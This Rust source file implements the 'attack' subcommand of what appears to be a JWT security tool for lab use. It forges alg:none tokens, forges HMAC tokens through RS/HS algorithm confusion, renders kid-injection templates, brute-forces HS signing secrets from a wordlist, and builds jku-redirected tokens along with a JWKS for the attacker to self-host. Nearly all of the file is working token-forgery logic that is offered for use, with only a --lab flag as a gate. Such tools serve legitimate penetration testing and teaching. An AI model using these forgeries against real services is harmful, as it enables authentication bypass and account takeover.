//! `jwt-tui attack ...` — offensive helpers (lab use only).

use std::path::PathBuf;
use std::process::ExitCode;
use std::sync::atomic::Ordering;
use std::sync::Arc;
use std::time::Instant;

use clap::Subcommand;
use jwt_core::attacks::{alg_confusion, alg_none, hs_brute, kid_injection, LAB_BANNER};
use jwt_core::sign::Algorithm;

use super::{read_inline_or_stdin, read_value_spec};

#[derive(Debug, Subcommand)]
pub enum AttackCommand {
    /// Forge a token with `alg: none`.
    AlgNone {
        token: Option<String>,
        /// One of `none`, `None`, `NONE`, `nOnE`, or `all` (emits all).
        #[arg(long, default_value = "none")]
        variant: String,
    },
    /// Forge an HS256/384/512 token from an RS-signed token + its public key.
    HsConfusion {
        token: Option<String>,
        /// Public key file (PEM).
        #[arg(long)]
        public_key: PathBuf,
        /// HS algorithm to forge.
        #[arg(long, default_value = "HS256")]
        hs: String,
        /// Try every common public-key permutation (PEM trimmed / with newline / body only).
        #[arg(long)]
        all_perms: bool,
    },
    /// Render `kid` injection templates.
    Kid {
        /// Print only one template by label.
        #[arg(long)]
        label: Option<String>,
    },
    /// Brute-force an HS* secret.
    HsBrute {
        token: Option<String>,
        #[arg(long)]
        wordlist: PathBuf,
        #[arg(long)]
        unlimited: bool,
        #[arg(long, default_value_t = 0)]
        threads: usize,
    },
    /// Emit a `jku`-redirected token plus a sample JWKS the user must self-host.
    JkuRedirect {
        token: Option<String>,
        /// URL to inject as `jku`.
        #[arg(long)]
        url: String,
    },
}

/// Confirm that `--lab` was passed before any offensive subcommand runs.
pub fn ensure_lab(lab: bool) -> anyhow::Result<()> {
    if !lab {
        return Err(anyhow::anyhow!(
            "this is a lab-only command — re-run with `--lab` to acknowledge"
        ));
    }
    eprintln!("{LAB_BANNER}");
    Ok(())
}

pub fn run(cmd: AttackCommand, json: bool) -> anyhow::Result<ExitCode> {
    match cmd {
        AttackCommand::AlgNone { token, variant } => alg_none_cmd(token, &variant, json),
        AttackCommand::HsConfusion {
            token,
            public_key,
            hs,
            all_perms,
        } => hs_confusion_cmd(token, &public_key, &hs, all_perms, json),
        AttackCommand::Kid { label } => kid_cmd(label.as_deref(), json),
        AttackCommand::HsBrute {
            token,
            wordlist,
            unlimited,
            threads,
        } => hs_brute_cmd(token, &wordlist, unlimited, threads, json),
        AttackCommand::JkuRedirect { token, url } => jku_cmd(token, &url, json),
    }
}

fn alg_none_cmd(token: Option<String>, variant: &str, json: bool) -> anyhow::Result<ExitCode> {
    let token =
        read_inline_or_stdin(token.as_deref())?.ok_or_else(|| anyhow::anyhow!("no token given"))?;
    if variant == "all" {
        let v = alg_none::forge_all_variants(&token)?;
        if json {
            println!("{}", serde_json::to_string_pretty(&v)?);
        } else {
            for (k, t) in v {
                println!("# {k}");
                println!("{t}");
            }
        }
    } else {
        let t = alg_none::forge(&token, variant)?;
        if json {
            println!("{}", serde_json::json!({"variant": variant, "token": t}));
        } else {
            println!("{t}");
        }
    }
    Ok(ExitCode::SUCCESS)
}

fn hs_confusion_cmd(
    token: Option<String>,
    public_key: &std::path::Path,
    hs: &str,
    all_perms: bool,
    json: bool,
) -> anyhow::Result<ExitCode> {
    let token =
        read_inline_or_stdin(token.as_deref())?.ok_or_else(|| anyhow::anyhow!("no token given"))?;
    let alg = Algorithm::from_jose(hs)?;
    let pem = std::fs::read_to_string(public_key)?;
    if all_perms {
        let v = alg_confusion::forge_all_perms(&token, &pem, alg)?;
        if json {
            println!("{}", serde_json::to_string_pretty(&v)?);
        } else {
            for (k, t) in v {
                println!("# {k}");
                println!("{t}");
            }
        }
    } else {
        let t = alg_confusion::forge(&token, pem.as_bytes(), alg)?;
        if json {
            println!("{}", serde_json::json!({"alg": hs, "token": t}));
        } else {
            println!("{t}");
        }
    }
    Ok(ExitCode::SUCCESS)
}

fn kid_cmd(label: Option<&str>, json: bool) -> anyhow::Result<ExitCode> {
    let templates = kid_injection::TEMPLATES;
    let filtered: Vec<_> = match label {
        Some(l) => templates.iter().filter(|t| t.label == l).collect(),
        None => templates.iter().collect(),
    };
    if json {
        println!("{}", serde_json::to_string_pretty(&filtered)?);
    } else {
        for t in filtered {
            println!("[{}] {} — {}", t.label, t.class, t.kid);
            println!("  {}", t.explanation);
            println!();
        }
    }
    Ok(ExitCode::SUCCESS)
}

fn hs_brute_cmd(
    token: Option<String>,
    wordlist: &std::path::Path,
    unlimited: bool,
    threads: usize,
    json: bool,
) -> anyhow::Result<ExitCode> {
    let token =
        read_inline_or_stdin(token.as_deref())?.ok_or_else(|| anyhow::anyhow!("no token given"))?;

    if threads > 0 {
        rayon::ThreadPoolBuilder::new()
            .num_threads(threads)
            .build_global()
            .map_err(|e| anyhow::anyhow!("rayon thread pool: {e}"))?;
    }
    let progress = Arc::new(hs_brute::BruteProgress::default());
    let opts = if unlimited {
        hs_brute::BruteOptions::unlimited()
    } else {
        hs_brute::BruteOptions::capped()
    };
    let prog_clone = progress.clone();
    let start = Instant::now();
    let reporter = std::thread::spawn(move || loop {
        std::thread::sleep(std::time::Duration::from_millis(500));
        if prog_clone.found.load(Ordering::Relaxed) {
            break;
        }
        let n = prog_clone.attempts.load(Ordering::Relaxed);
        if n == 0 {
            break;
        }
        let secs = start.elapsed().as_secs_f64().max(0.001);
        let rate = n as f64 / secs;
        eprintln!("[brute] tried {n}, rate {:.0}/s", rate);
        if prog_clone.found.load(Ordering::Relaxed) {
            break;
        }
    });

    let outcome = hs_brute::brute_wordlist_file(&token, wordlist, &opts, Some(progress))?;
    let _ = reporter.join();

    if json {
        let secret_str = outcome
            .secret
            .as_ref()
            .map(|s| String::from_utf8_lossy(s).into_owned());
        println!(
            "{}",
            serde_json::to_string_pretty(&serde_json::json!({
                "attempts": outcome.attempts,
                "secret": secret_str,
            }))?
        );
    } else if let Some(s) = &outcome.secret {
        println!("FOUND: {}", String::from_utf8_lossy(s));
    } else {
        println!("not found ({} attempts)", outcome.attempts);
    }

    Ok(if outcome.secret.is_some() {
        ExitCode::SUCCESS
    } else {
        ExitCode::from(1)
    })
}

fn jku_cmd(token: Option<String>, url: &str, json: bool) -> anyhow::Result<ExitCode> {
    let token =
        read_inline_or_stdin(token.as_deref())?.ok_or_else(|| anyhow::anyhow!("no token given"))?;
    let decoded = jwt_core::parse::decode_unverified(&token)?;
    let mut header = serde_json::to_value(&decoded.header)?;
    if let Some(o) = header.as_object_mut() {
        o.insert("jku".into(), serde_json::Value::String(url.to_owned()));
    }
    let header_b64 = jwt_core::parse::encode_segment_json(&header)?;
    let new_token = format!("{header_b64}.{}.", decoded.raw_payload);

    let sample_jwks = serde_json::json!({
        "keys": [{
            "kty": "oct",
            "kid": decoded.header.kid,
            "alg": "HS256",
            "k": "self-host-this-key-and-sign-tokens-with-it"
        }]
    });
    if json {
        println!(
            "{}",
            serde_json::to_string_pretty(&serde_json::json!({
                "token_unsigned": new_token,
                "sample_jwks_to_self_host": sample_jwks,
            }))?
        );
    } else {
        println!("# unsigned token (replace trailing `.` with your forged signature)");
        println!("{new_token}");
        println!();
        println!("# sample JWKS to self-host at {url}");
        println!("{}", serde_json::to_string_pretty(&sample_jwks)?);
    }
    let _ = read_value_spec; // keep helper alive
    Ok(ExitCode::SUCCESS)
}
